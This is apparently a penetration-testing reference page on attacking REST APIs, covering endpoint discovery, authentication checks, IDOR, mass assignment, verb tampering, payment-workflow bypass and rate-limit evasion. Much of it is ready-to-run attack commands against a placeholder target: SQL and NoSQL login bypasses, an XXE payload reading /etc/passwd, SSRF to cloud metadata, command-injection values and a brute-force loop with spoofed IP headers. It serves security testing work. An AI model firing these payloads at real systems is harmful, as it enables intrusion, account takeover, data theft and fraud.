REST API Testing

REST APIs are a primary attack surface in modern applications. They often lack the browser-enforced protections of web UIs, use custom authentication mechanisms, and expose endpoints not intended for direct use. This page covers REST API reconnaissance, common vulnerability patterns, testing methodology, and attack techniques including IDOR, mass assignment, broken authentication, and workflow bypass.

REST API Reconnaissance

# Discover API endpoints — look everywhere:

# 1. JavaScript source files (most effective):
# Download all JS files from target, grep for API calls:
gau target.com | grep "\.js$" | sort -u | xargs -I{} wget -q {}
grep -r "api/\|/v1/\|/v2/\|fetch\|axios\|XMLHttpRequest" *.js | grep -oE "(/[a-zA-Z0-9_/]+){2,}" | sort -u

# 2. API documentation:
# Check common paths: /swagger.json, /openapi.json, /api-docs, /swagger-ui.html
curl -s https://target.com/swagger.json | python3 -m json.tool
curl -s https://target.com/api-docs
curl -s https://target.com/v1/swagger.json

# 3. Burp Suite passive crawl — capture all requests during manual testing

# 4. WADL/WSDL discovery (REST/SOAP):
curl -s https://target.com/api/application.wadl
curl -s https://target.com/service?wsdl

# 5. robots.txt and sitemap:
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml

# 6. URL path fuzzing:
ffuf -u https://api.target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt
ffuf -u https://api.target.com/v1/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt

# 7. HTTP verb discovery per endpoint:
curl -X OPTIONS https://api.target.com/users -v 2>&1 | grep "Allow:"

Authentication Analysis

# Identify auth mechanism from requests:
# Authorization: Bearer TOKEN          → JWT or opaque bearer token
# Authorization: Basic BASE64          → Basic auth (often legacy)
# X-API-Key: KEY                       → API key auth
# Cookie: session=TOKEN                → Cookie-based (check HttpOnly, Secure flags)
# Custom header: X-Auth-Token: TOKEN   → custom mechanism

# JWT testing (see /web/jwt-attacks/ for deep dive):
# Decode header without verification:
echo "TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo "TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Quick JWT checks:
# 1. Algorithm: "alg":"none" bypass
# 2. Algorithm confusion: RS256 → HS256 with public key
# 3. Expired token still accepted (no exp check)
# 4. Signature not verified (accepts any signature)

# API key testing:
# - Rotate API key values: change last few chars
# - Try no API key at all
# - Try API key in different locations: header, query param, body
curl https://api.target.com/sensitive -H "X-API-Key: " # empty key
curl "https://api.target.com/sensitive?api_key=VALID_KEY"  # in URL
curl "https://api.target.com/sensitive?api_key="   # empty in URL

IDOR — Insecure Direct Object Reference

# Most impactful REST API vulnerability
# Replace IDs with other users' IDs to access unauthorized resources

# Test sequential IDs:
# GET /api/v1/users/1001  (your account)
# GET /api/v1/users/1000  (another user's data)
# GET /api/v1/users/1     (admin account?)

# Test with Burp Intruder — increment ID parameter:
# Set payload: 1000 to 2000, step 1
# Flag responses that differ from your account's response

# Non-sequential ID bypass:
# GUIDs: GET /api/v1/orders/a1b2c3d4-e5f6-7890-abcd-ef1234567890
# Hash IDs: GET /api/v1/documents/md5_of_doc_id
# Test by: requesting your own resource, examining other users' activity in app,
#          checking links shared by other users

# HTTP method switching for IDOR bypass:
# GET /api/v1/users/1001 → 403
# POST /api/v1/users/1001 → 200 (different auth check for different verbs)
# DELETE /api/v1/users/1001 → may work even if GET denied

# Parameter pollution for IDOR:
# Standard: GET /api/v1/profile?user_id=1001
# Attack: GET /api/v1/profile?user_id=1001&user_id=1000
# Or in JSON body: {"user_id": [1001, 1000]}

# Verify IDOR by creating two test accounts (A and B):
# Log in as A, get A's resource ID
# Log in as B, try to access A's resource ID

Mass Assignment

# Many REST APIs accept JSON and automatically map body fields to object properties
# Include privileged fields the API never intended to expose

# Test registration endpoint — include role, admin, isAdmin:
curl -X POST https://api.target.com/users/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Pass123","email":"a@b.com","role":"admin"}'

# Test profile update — include internal fields:
curl -X PUT https://api.target.com/users/profile \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"New Name","balance":99999,"role":"admin","verified":true,"subscription":"premium"}'

# Discover mass assignable fields:
# 1. GET the object first — note all fields in response
# 2. PUT/PATCH with those same fields + guessed internal ones
# 3. Compare before/after responses

# Common fields to try:
# role, isAdmin, admin, superuser, privilege, level, tier
# balance, credits, quota, limit
# verified, active, enabled, confirmed
# created_at, updated_at (can sometimes modify)
# subscription, plan, tier, membership_type

HTTP Verb Tampering

# Some frameworks handle authorization differently per verb
# Test all verbs against each endpoint:
for verb in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo "--- $verb ---"
  curl -sI -X $verb https://api.target.com/admin/users \
    -H "Authorization: Bearer USER_TOKEN"
done

# Verb override headers (some frameworks honor these):
curl -X POST https://api.target.com/admin/users \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer USER_TOKEN"

curl -X POST https://api.target.com/resource \
  -H "X-Method-Override: PUT"

curl -X POST https://api.target.com/resource \
  -H "X-Http-Method: PATCH"

# Content-Type manipulation:
# If endpoint expects application/json:
# Try: text/plain, application/x-www-form-urlencoded, multipart/form-data
# Different parsers may bypass validation

Out-of-Order API Workflow Bypass

# Business logic flaws — bypass multi-step workflows
# Example: payment flow requires: create → pay → confirm

# Map the workflow:
# POST /api/checkout/create   → {"checkout_id": "abc123"}
# POST /api/checkout/pay      → requires checkout_id + payment
# POST /api/checkout/confirm  → marks order complete

# Test: skip pay step entirely:
curl -X POST https://api.target.com/api/checkout/create \
  -H "Authorization: Bearer TOKEN" \
  -d '{"items": [{"id": 1, "qty": 1}]}'
# capture checkout_id

# Skip directly to confirm:
curl -X POST https://api.target.com/api/checkout/confirm \
  -H "Authorization: Bearer TOKEN" \
  -d '{"checkout_id": "abc123"}'
# If order completes without payment → critical business logic flaw

# Other workflow tests:
# Password reset: skip email verification
# Email change: confirm new email without verifying old
# Subscription: jump to premium content without payment step
# Voting: vote multiple times by replaying request

Rate Limiting and Brute Force

# Test rate limiting on sensitive endpoints:

# Endpoint: /api/auth/login
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST https://api.target.com/api/auth/login \
    -d '{"username":"admin","password":"wrong'$i'"}'
done
# If all 200 (or 401): no rate limiting → brute force viable

# Bypass rate limiting:
# X-Forwarded-For rotation:
for i in $(seq 1 100); do
  curl -X POST https://api.target.com/api/auth/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "username=admin&password=guess$i"
done

# Other bypass headers to try:
# X-Real-IP, X-Originating-IP, X-Client-IP, CF-Connecting-IP
# Forwarded: for=IP

# True-Client-IP (Cloudflare):
curl -H "True-Client-IP: 1.2.3.4" https://api.target.com/login

# API key rate limits:
# If rate limited per API key, does creating a new key reset limits?
# Some APIs rate limit by IP, not by API key

Content Type and Injection Testing

# Every parameter in REST API body/URL is a potential injection point
# Test systematically with Burp Intruder

# SQL injection in API parameters:
curl -X GET "https://api.target.com/users?id=1'" -H "Authorization: Bearer TOKEN"
curl -X GET "https://api.target.com/search?q=test' OR '1'='1" -H "Authorization: Bearer TOKEN"

# JSON-specific SQL injection:
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "anything"}'

# NoSQL injection (MongoDB common in APIs):
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# XXE via XML Content-Type:
curl -X POST https://api.target.com/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# SSRF via URL parameters:
curl -X POST https://api.target.com/fetch \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Command injection:
curl -X POST https://api.target.com/process \
  -d '{"filename": "test.txt; id"}'
  -d '{"filename": "test.txt|id"}'
  -d '{"filename": "$(id)"}'

API Testing Checklist

# Reconnaissance:
# [ ] Discovered all endpoints (swagger, JS, fuzzing)
# [ ] Mapped HTTP methods per endpoint
# [ ] Identified authentication mechanism
# [ ] Found API version endpoints (/v1, /v2)

# Authentication:
# [ ] Tested JWT vulnerabilities (alg:none, alg confusion, expired)
# [ ] Tested API key bypass (missing, empty, reused)
# [ ] Tested unauthenticated access to each endpoint
# [ ] Tested rate limiting on auth endpoints

# Authorization:
# [ ] Tested IDOR on all ID parameters
# [ ] Tested horizontal privilege escalation (access other users' resources)
# [ ] Tested vertical privilege escalation (regular user → admin)
# [ ] Tested HTTP verb tampering

# Input Validation:
# [ ] SQL injection in all parameters
# [ ] NoSQL injection (if MongoDB/similar)
# [ ] XXE if XML accepted
# [ ] SSRF in URL parameters
# [ ] Mass assignment (include role/admin/privilege fields)
# [ ] Command injection in file/process-related parameters

# Business Logic:
# [ ] Workflow bypass (skip payment, skip verification)
# [ ] Negative values (negative quantity, negative price)
# [ ] Parameter pollution
# [ ] Race conditions on state-changing endpoints
